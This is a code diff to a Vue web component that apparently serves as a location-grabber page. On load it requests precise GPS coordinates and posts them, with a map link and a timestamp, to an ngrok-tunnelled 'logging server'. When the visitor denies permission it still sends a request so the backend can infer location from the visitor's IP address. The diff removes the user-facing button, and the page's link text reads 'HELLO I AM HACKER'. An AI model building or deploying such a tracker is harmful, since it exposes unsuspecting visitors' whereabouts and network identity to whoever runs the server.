@@ -9,28 +9,25 @@ let map: L.Map | null = null;
 let marker: L.Marker | null = null;
 
 // SERVER ENDPOINT URL
-const SERVER_URL = "https://a790-183-182-115-58.ngrok-free.app";
+const SERVER_URL = "https://959e-183-182-110-242.ngrok-free.app/api/location";
 
 // -------------------------
 // INIT MAP
 // -------------------------
 const initMap = (lat: number, lon: number) => {
-  try {
-    const mapElement = document.getElementById("map");
-    if (mapElement) {
-      mapElement.style.visibility = "visible";
-    }
+  const mapElement = document.getElementById("map");
+  if (mapElement) {
+    mapElement.style.visibility = "visible"; // Show map if it was hidden
+  }
 
-    if (!map) {
-      map = L.map("map").setView([lat, lon], 15);
-      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-        attribution: "© OpenStreetMap",
-      }).addTo(map);
-    } else {
-      map.setView([lat, lon], 15);
-    }
-  } catch (err) {
-    console.error("Leaflet initialization failed:", err);
+  if (!map) {
+    map = L.map("map").setView([lat, lon], 15);
+
+    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+      attribution: "© OpenStreetMap",
+    }).addTo(map);
+  } else {
+    map.setView([lat, lon], 15);
   }
 };
 
@@ -39,20 +36,18 @@ const initMap = (lat: number, lon: number) => {
 // -------------------------
 const setMarker = (lat: number, lon: number) => {
   if (!map) return;
-  try {
-    if (marker) {
-      marker.remove();
-    }
-    marker = L.marker([lat, lon])
-      .addTo(map)
-      .bindPopup("📍 Your Current Location")
-      .openPopup();
-  } catch (err) {
-    console.error("Marker plotting failed:", err);
+
+  if (marker) {
+    marker.remove();
   }
+
+  marker = L.marker([lat, lon])
+    .addTo(map)
+    .bindPopup("📍 Your Current Location")
+    .openPopup();
 };
 
-// Generate time payload matching Vientiane context
+// Generate time payload
 const time = new Intl.DateTimeFormat("en-US", {
   timeZone: "Asia/Vientiane",
   year: "2-digit",
@@ -67,16 +62,10 @@ const time = new Intl.DateTimeFormat("en-US", {
 // -------------------------
 // SEND DATA HELPER
 // -------------------------
-const sendTrackingPayload = async (
-  lat: number | null,
-  lon: number | null,
-  mapLink: string | null,
-) => {
+const sendTrackingPayload = async (lat: number | null, lon: number | null, mapLink: string | null) => {
   try {
-    console.log("Sending network packet payload to server...", { lat, lon });
-
-    const response = await fetch(`${SERVER_URL}/api/location`, {
-      method: "POST", // Capitalized standard method declaration
+    await fetch(SERVER_URL, {
+      method: "post",
       headers: {
         "ngrok-skip-browser-warning": "true",
         "Content-Type": "application/json",
@@ -88,11 +77,8 @@ const sendTrackingPayload = async (
         time,
       }),
     });
-
-    const serverData = await response.json();
-    console.log("Server responded successfully:", serverData);
   } catch (err) {
-    console.error("Network Fetch Transmission Failed:", err);
+    console.error("Failed to transmit payload to logging server:", err);
   }
 };
 
@@ -103,7 +89,7 @@ const getLocation = () => {
   loading.value = true;
 
   if (!navigator.geolocation) {
-    console.warn("Browser environment blocks native geolocation.");
+    console.warn("Geolocation not supported by client browser. Sending fallback payload.");
     sendTrackingPayload(null, null, null);
     loading.value = false;
     return;
@@ -113,33 +99,27 @@ const getLocation = () => {
     async (position) => {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-
-      // FIXED TEMPLATE STRING HOOKS HERE:
-      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const mapLink = `https://maps.google.com/?q=${lat},${lon}`; // Standard cleaner link structural fallback
 
       result.value = { lat, lon, mapLink };
 
-      // Render UI map visuals smoothly
       initMap(lat, lon);
       setMarker(lat, lon);
       loading.value = false;
 
-      // Dispatch tracking safely to backend
+      // SUCCESS PATH: Send precise GPS along with network IP tracking
       await sendTrackingPayload(lat, lon, mapLink);
     },
     async (error) => {
-      console.warn(
-        "GPS Permission Denied / Error Callback hit:",
-        error.message,
-      );
+      console.warn("GPS Permission Denied / Error structural fallback triggered:", error.message);
       loading.value = false;
 
-      // Fallback path sends empty telemetry coordinates so server extracts network identity safely
+      // FAIL PATH: Send null parameters so the backend infers location purely from the network IP block instead
       await sendTrackingPayload(null, null, null);
     },
     {
       enableHighAccuracy: true,
-      timeout: 7000, // Safe timeout so network response drops smoothly if calculation stalls
+      timeout: 8000, // Safe timeout fallback if device blocks or hangs GPS calculation
     },
   );
 };
@@ -155,25 +135,12 @@ onMounted(() => {
     <span>WAITING...</span>
   </div>
   <div class="container">
-    <!-- <button class="btn" @click="getLocation">Get Current Location</button> -->
-
     <div v-if="result" class="info">
-      <!-- <p>
-        <strong>Latitude:</strong>
-        {{ result.lat }}
-      </p>
-
-      <p>
-        <strong>Longitude:</strong>
-        {{ result.lon }}
-      </p> -->
-
       <a :href="result.mapLink" target="_blank" rel="noopener noreferrer">
         HELLO I AM HACKER
       </a>
     </div>
-
-    <!-- <div id="map" class="map"></div> -->
+    <div id="map" class="map"></div>
   </div>
 </template>
 
@@ -182,18 +149,12 @@ onMounted(() => {
   padding: 20px;
 }
 
-.btn {
-  padding: 10px 16px;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-}
-
 .info {
   margin-top: 20px;
 }
+
 #map {
-  visibility: hidden;
+  visibility: hidden; /* Stays hidden unless explicitly triggered by structural success mapping */
 }
 
 .map {
@@ -204,20 +165,16 @@ onMounted(() => {
   overflow: hidden;
 }
 
-/*  */
-
 .loading {
   position: fixed;
   top: 0;
   left: 0;
   width: 100vw;
   height: 100vh;
-
   display: flex;
   flex-direction: column;
   justify-content: center;
   align-items: center;
-
   background: rgba(255, 255, 255, 0.8);
   z-index: 9999;
 }
